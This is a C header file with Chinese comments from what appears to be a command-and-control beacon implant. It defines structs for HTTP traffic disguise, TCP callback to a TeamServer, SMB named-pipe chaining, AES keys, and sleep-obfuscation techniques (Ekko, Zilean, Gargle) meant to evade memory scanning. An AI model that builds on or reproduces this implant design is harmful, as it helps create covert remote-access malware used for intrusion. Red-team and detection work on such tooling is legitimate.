#pragma once

#include "beacon_common.h"

/* HTTP transform 中的单个数据位置/编码规则 */
typedef struct HttpDataTransform {
    UINT8 present;              /* 0=absent, 1=present */
    UINT8 location;             /* 0=none, 1=body, 2=header, 3=query */
    UINT8 encoding;             /* 0=none, 1=raw, 2=base64, 3=base64url */
    UINT8 output_mode;          /* 0=none, 1=binary, 2=print */
    CHAR name[64];              /* header/query 名称 */
    CHAR prefix[128];           /* 编码后前缀 */
    CHAR suffix[128];           /* 编码后后缀 */
} HttpDataTransform;

/* 一个 HTTP method 的 wire transform */
typedef struct HttpMethodTransform {
    HttpDataTransform metadata;      /* 加密 heartbeat */
    HttpDataTransform stage_output;  /* 加密结果 */
    HttpDataTransform server_output; /* 加密任务响应 */
} HttpMethodTransform;

/* HTTP transform TLV 解析结果 */
typedef struct HttpTransformConfig {
    UINT8 present;              /* 是否出现过 CfgHTTPTransform */
    UINT16 version;             /* 当前仅支持 version=1 */
    HttpMethodTransform get;
    HttpMethodTransform post;
} HttpTransformConfig;

/* HTTP 传输配置 */
typedef struct HttpProfile {
    CHAR method[16];            /* HTTP 方法（GET/POST） */
    CHAR target[256];           /* 目标 URI 路径 */
    CHAR uri[256];              /* 完整 URI */
    CHAR host_header[256];      /* Host 头 */
    CHAR response_headers[1024];/* 自定义响应头 */
    CHAR user_agent[256];       /* User-Agent */
    CHAR content_type[128];     /* Content-Type */
    CHAR encrypt_key[128];      /* AES 加密密钥（hex 编码） */
    CHAR ssl_cert[1024];        /* SSL 证书路径 */
    CHAR ssl_key[2048];         /* SSL 私钥路径 */
    INT ssl;                    /* 是否启用 SSL */
    INT x_forwarded_for;        /* 是否添加 X-Forwarded-For 头 */
    INT reconnect_count;        /* 重连次数上限 */
    INT reconnect_time_ms;      /* 重连间隔（ms） */
    HttpTransformConfig transform; /* 新版 HTTP wire transform */
} HttpProfile;

/* external TCP 回连配置 */
typedef struct TcpExternalProfile {
    CHAR callback_host[256];    /* TeamServer TCP listener 回连地址 */
    INT callback_port;          /* TeamServer TCP listener 回连端口 */
    INT reconnect_count;        /* 重连次数上限 */
    INT reconnect_time_ms;      /* 重连间隔（ms） */
    INT ssl;                    /* 是否启用 TLS（SChannel） */
    CHAR encrypt_key[128];      /* AES 加密密钥（hex 编码） */
} TcpExternalProfile;

/* internal TCP 级联配置 */
typedef struct TcpInternalProfile {
    CHAR bind_host[64];         /* 监听地址 */
    INT bind_port;              /* 监听端口 */
    INT connect_timeout_ms;     /* 连接超时（ms） */
} TcpInternalProfile;

/* internal SMB 级联配置 */
typedef struct SmbInternalProfile {
    CHAR pipe_name[128];        /* 命名管道路径 */
    INT connect_timeout_ms;     /* 连接超时（ms） */
} SmbInternalProfile;

/* 睡眠混淆技术选择 */
typedef enum SleepObfTechnique {
    SLEEP_OBF_NONE = 0,        /* 不使用混淆 */
    SLEEP_OBF_EKKO = 1,        /* RtlCreateTimerQueue + NtContinue */
    SLEEP_OBF_ZILEAN = 2,      /* RtlRegisterWait */
    SLEEP_OBF_GARGLE = 3       /* 当前线程 mask + 常规 wait，避免 NtContinue callback 链 */
} SleepObfTechnique;

/* sleep 混淆定位映像所需的预计算布局 */
typedef struct SleepObfImageLayout {
    BOOL valid;                 /* 是否由 profile patch 提供 */
    UINT32 image_size;          /* OptionalHeader.SizeOfImage */
    UINT32 text_rva;            /* .text VirtualAddress */
    UINT32 text_size;           /* .text VirtualSize/RawSize */
    UINT32 text_protect;        /* .text 原始保护属性 */
} SleepObfImageLayout;

/* Beacon 通信配置 */
typedef struct Profile {
    CHAR listener_name[128];    /* 监听器名称 */
    CHAR listener_type[64];     /* 监听器类型（external/internal） */
    CHAR protocol[32];          /* 协议（http/tcp/smb） */
    CHAR format[32];            /* 输出格式 */
    INT sleep_ms;               /* 基础睡眠时间（ms） */
    INT jitter;                 /* 抖动百分比（0-100） */
    INT conn_timeout_sec;       /* 连接超时（秒） */
    BOOL sleep_obf_enabled;     /* 是否启用睡眠混淆 */
    SleepObfTechnique sleep_obf_technique; /* 混淆技术选择 */
    SleepObfImageLayout sleep_layout; /* 预计算映像布局 */
    CHAR encrypt_key[128];      /* 通用通信加密 key */
    HttpProfile http;           /* HTTP 传输配置 */
    TcpExternalProfile tcp_external; /* TCP external 回连配置 */
    TcpInternalProfile tcp_internal; /* TCP 级联配置 */
    SmbInternalProfile smb_internal; /* SMB 级联配置 */
} Profile;

/* 从 beacon 元数据中加载配置 */
VOID ProfileLoad(Profile* profile);
